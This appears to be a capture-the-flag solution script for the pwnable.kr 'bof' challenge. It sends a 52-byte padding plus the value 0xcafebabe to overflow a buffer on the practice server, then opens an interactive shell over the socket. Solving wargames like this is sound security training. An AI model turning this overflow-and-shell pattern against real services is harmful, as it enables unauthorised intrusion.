from socket import socket
from telnetlib import Telnet

sock = socket()
sock.connect(('pwnable.kr', 9000))
sock.send('B'*52 + '\xbe\xba\xfe\xca')

#interactive mode
t = Telnet()
t.sock = sock
t.interact()
sock.close()
